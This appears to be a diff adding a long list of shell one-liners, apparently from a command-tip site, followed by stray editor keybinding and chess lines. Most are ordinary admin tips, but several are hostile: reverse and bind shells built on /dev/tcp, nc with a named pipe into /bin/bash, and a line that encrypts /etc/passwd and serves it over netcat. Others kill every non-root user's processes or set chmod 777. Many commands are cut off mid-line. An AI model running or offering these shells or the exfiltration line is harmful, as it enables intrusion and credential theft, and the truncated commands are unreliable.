+scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql
+perl -e 'while(1){print"> ";eval<>}'
+nmap -T4 -sP 192.168.2.0/24 && egrep "00:00:00:00:00:00" /proc/net/arp
+mail -s "subject" user@todomain.com <emailbody.txt  -- -f customfrom@fromdomain.
+find . -type d -empty -delete
+lsof -p $(pidof firefox) | awk '/.mozilla/ { s = int($7/(2^20)); if(s>0) print (
+colordiff -yW"`tput cols`" /path/to/file1 /path/to/file2
+grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'
+curl -s "http://www.geody.com/geoip.php?ip=$(curl -s icanhazip.com)" | sed '/^IP
+curl http://www.whatismyip.org/
+VBoxManage internalcommands converttoraw winxp.vdi winxp.raw && qemu-img convert
+sh -c 'S=askapache R=htaccess; find . -mount -type f|xargs -P5 -iFF grep -l -m1
+find -type f -name "*.avi" -print0 | xargs -0  mplayer -vo dummy -ao dummy -iden
+cat /etc/passwd | openssl aes-256-cbc -a -e -pass pass:password | netcat -l -p 8
+ls -lct /etc | tail -1 | awk '{print $6, $7}'
+while read server; do ssh -n user@$server "command"; done < servers.txt
+ls | while read f; do mv "$f" "${f// /_}";done
+find . -type f -printf '%20s %p\n' | sort -n | cut -b22- | tr '\n' '\000' | xarg
+grep -r --include="*.[ch]" pattern .
+taskset -cp <core> <pid>
+curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->command
+ab -n 9000 -c 900 localhost:8080/index.php
+ssh -L :: -L :: @
+iptables -t nat -A PREROUTING -p tcp --dport [port of your choosing] -j REDIRECT
+ldapsearch -LLL -H ldap://activedirectory.example.com:389 -b 'dc=example,dc=com'
+mecp () { scp "$@" ${SSH_CLIENT%% *}:Desktop/; }
+echo "$(( 0x10 )) - $(( 010 )) = $(( 0x10 - 010 ))"
+find ./ -type f -exec sed -i 's/\t/  /g' {} \;
+alt + 1 .
+ifconfig en1 | awk '/inet / {print $2}' | mail -s "hello world" email@email.com
+cal 09 1752
+script /dev/null | tee /dev/pts/3
+mtr --report --report-cycles 10 www.google.com > google_net_report.txt
+alias rot13="tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"
+while true; do X=$Y; sleep 1; Y=$(ifconfig eth0|grep RX\ bytes|awk '{ print $2 }
+swapoff -a ; swapon -a
+ls | while read ITEM; do echo "$ITEM"; done
+dd if=/dev/cdrom | pv -s 700m | md5sum | tee test.md5
+tcptraceroute www.google.com
+jhead -autorot *.jpg
+!date
+hdparm -i[I] /dev/sda
+split -b 19m file Nameforpart
+while [ 1 ]; do curl -s -u username:password  http://twitter.com/statuses/friend
+vimtutor
+ps aux | grep [h]ttpd
+rename 's/foo/bar/g' *
+perl -pi.bk -e's/foo/bar/g' file1 file2 fileN
+sudo who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'
+paste -d: <(ls -1 *.mp4) <(ls -1 *.srt) | while read line; do movie="${line%%:*}
+ssh -J user@reachable_host user@unreacheable_host
+chmod 777 !*
+command systemctl --no-page --no-legend --plain -t service --state=running
+cat *.jpg | ffmpeg -f image2pipe -r 1 -vcodec mjpeg -i - -vcodec libx264 out.mp4
+perl -e 'for(;;sleep 1){printf"\r"."%.4b "x6,split"",`date +%H%M%S`}'
+nik=clf$RANDOM;sr=irc.efnet.org;expect -c "set timeout -1;spawn nc $sr 6666;set
+clear;while true;sleep 1;do for((a=1;a<=$(tput cols)/3;a++));do tput cup 0 $a;ec
+<ctrl>+o
+server$ while true; do read -n30 ui; echo $ui |openssl enc -aes-256-ctr -a -k Pa
+Ctrl+k
+ln -s /BASE/* /TARGET/
+rsync -v -r --size-only --compare-dest=../A/ B/ C/
+<Meta-p> (aka <ALT+P>)
+if [[ ":$PATH:" != *":$dir:"* ]]; then PATH=${PATH}:$dir; fi
+inotifywait -m -r .
+python -c 'import sys, yaml, json; yaml.safe_dump(json.load(sys.stdin), sys.stdo
+Q="YOURSEARCH"; GOOG_URL="http://www.google.com/search?q="; AGENT="Mozilla/4.0";
+exec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; d
+mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo
+find . -type f -print0 | xargs -0 du -h | sort -hr | head -10
+curl ifconfig.me/all
+up() { local x='';for i in $(seq ${1:-1});do x="$x../"; done;cd $x; }
+ls ${PATH//:/ }
+printf "%$(tput cols)s\n"|tr ' ' '='
+step1() { k1="Consumer key" ; k2="Consumer secret" ; k3="Access token" ; k4="Acc
+ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 && echo ONLINE || echo OFFLINE
+diff <(exiftool img_1.jpg) <(exiftool img_2.jpg)
+dpkg-repack firefox
+xmlstarlet sel -t -c "/path/to/element" file.xml
+awk 'NR >= 3 && NR <= 6' /path/to/file
+tcpdump -w - |pv -bert >/dev/null
+cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 32
+var=:foobar:; echo ${var:1:-1}
+cat <file> > /dev/null
+export PS1="[\u@`hostname -I` \W]$ "
+command > >(tee stdout.log) 2> >(tee stderr.log >&2)
+sed -e '/\\$/{:0;N;s/\\\n//;t0}'
+lower() { echo ${@,,}; }
+ls -l /etc/**/*killall
+convert input.png -alpha set -channel A -fx 0.5 output.png
+mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe
+awk '(length > n) {n = length} END {print n}'
+shopt -s histappend ; PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
+ssh vm-user@`VBoxManage guestproperty get "vm-name" "/VirtualBox/GuestInfo/Net/0
+sudo socat TCP4-LISTEN:80,bind=127.0.0.1,fork EXEC:'echo "HTTP/1.1 503 Service U
+arr[i*100+j]="whatever"
+echo "Terrorist threat level: `od -An -N1 -i /dev/random`"
+wget -e robots=off -E -H -k -K -p http://<page>
+echo "this is a test" | sed 's/.*/\L&/; s/[a-z]*/\u&/g'
+rtfm() { help $@ || info $@ || man $@ || $BROWSER "http://www.google.com/search?
+ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip
+xargs -n 2 mv < file_with_colums_of_names
+> file
+tail -f file | awk '{now=strftime("%F %T%z\t");sub(/^/, now);print}'
+`!!`
+badblocks -n -s -b 2048 /dev/sdX
+ontouchdo(){ while :; do a=$(stat -c%Y "$1"); [ "$b" != "$a" ] && b="$a" && sh -
+truncate -s 1M file
+/usr/bin/man $* || w3m -dump http://google.com/search?q="$*"\&btnI | less
+alias alert='notify-send -i /usr/share/icons/gnome/32x32/apps/gnome-terminal.png
+lsof /folder
+blkid /dev/sda7
+mussh -h host1 host2 host3 -c uptime
+exec 2>&1
+dig +short @resolver1.opendns.com myip.opendns.com
+echo ${fullpath##*/}
+for i in {0..255}; do echo -e "\e[38;05;${i}m${i}"; done | column -c 80 -s '  ';
+indent -kr hello.c
+echo 'some command' | batch
+mysqldump -q --skip-opt --force --log-error=dbname_error.log -uroot -pmysqlpassw
+tail -fs 1 somefile
+dd if=/dev/zero | pv | dd of=/dev/null
+cd() { if [ -z "$1" ]; then command cd; else if [ -f "$1" ]; then command cd $(d
+ssh -o UserKnownHostsFile=/dev/null root@192.168.1.1
+dd if=/dev/nst0 |pv|dd of=restored_file.tar
+curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-250
+count="1" ; while true ; do read next ; if [[ "$next" = "$last" ]] ; then count=
+mwiki() { dig +short txt "$*".wp.dg.cx; }
+python -c 'print "-"*50'
+ruby -e "i=0;loop{puts ' '*(29*(Math.sin(i)/2+1))+'|'*(29*(Math.cos(i)/2+1)); i+
+grep "^V<TAB>" your_file
+echo "message" | smbclient -M NAME_OF_THE_COMPUTER
+mplayer -novideo something.mpg
+mplayer -vo null something.mpg
+any_script.sh < <(some command)
+myinfo() { info --subnodes -o - $1 | less; }
+username=matthewbauer; curl -s http://www.commandlinefu.com/commands/by/$usernam
+for f in *;do mv "$f" "${f// /_}";done
+!$
+alias rc='ssh ${MEDIAPCHOSTNAME} env DISPLAY=:0.0 rhythmbox-client --no-start'
+find . ! -name <FILENAME> -delete
+grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk '/install / {print $4}' | uniq
+curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -
+setterm -powersave off -blank 0
+watch -n60 du /var/log/messages
+mmv 'banana_*_*.asc' 'banana_#2_#1.asc'
+[ `date --date='next day' +'%B'` == `date +'%B'` ] || echo 'end of month'
+for i in {21..29}; do nc -v -n -z -w 1 192.168.0.$i 443; done
+echo $(date +%s) > start-time; URL=http://www.google.com; while true; do echo $(
+(IFS=:;for p in $PATH; do test -d $p || echo $p; done)
+fd [query]
+fd -e [extension]
+find . -type f -name "*.[extension]"
+locate "*.[extension]"
+Up - CursorUp Down - CursorDown Right - CursorRight Left - CursorLeft ShiftUp -
+Alt-f - WordRight Alt-b - WordLeft Alt-a - StartOfLine Alt-e - EndOfLine
+F2 - Save F3 - Find F4 - Quit F7 - Find F10 - Quit Esc - Escape
+MouseWheelUp - ScrollUp MouseWheelDown - ScrollDown MouseLeft - MousePress Mouse
+gnuchess\n \n White (1) : Nf3\n 1. Nf3\n \n black  KQkq\n \n r n b q k b n r \n
